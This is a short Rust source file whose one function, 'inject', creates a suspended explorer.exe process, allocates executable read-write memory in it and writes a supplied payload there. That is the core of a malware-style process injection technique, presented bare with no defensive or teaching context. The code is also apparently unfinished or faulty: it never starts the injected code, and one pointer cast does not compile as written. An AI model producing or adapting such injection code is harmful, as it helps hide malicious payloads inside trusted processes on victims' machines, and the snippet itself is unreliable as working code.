use winapi::um::processthreadsapi::{CreateProcessA, PROCESS_INFORMATION, STARTUPINFOA};
use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
use winapi::um::winnt::{PROCESS_ALL_ACCESS, MEM_COMMIT, PAGE_EXECUTE_READWRITE};
use std::ptr;

pub fn inject(payload: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    unsafe {
        let mut si = STARTUPINFOA::default();
        let mut pi = PROCESS_INFORMATION::default();
        let cmd = "C:\\Windows\\System32\\explorer.exe\0";
        if CreateProcessA(ptr::null(), cmd as *mut i8, ptr::null_mut(), ptr::null_mut(), 0, 0x4, ptr::null_mut(), ptr::null_mut(), &mut si, &mut pi) == 0 {
            return Err("CreateProcess failed".into());
        }
        let remote = VirtualAllocEx(pi.hProcess, ptr::null_mut(), payload.len(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        WriteProcessMemory(pi.hProcess, remote, payload.as_ptr() as *const _, payload.len(), ptr::null_mut());
       
        Ok(())
    }
}
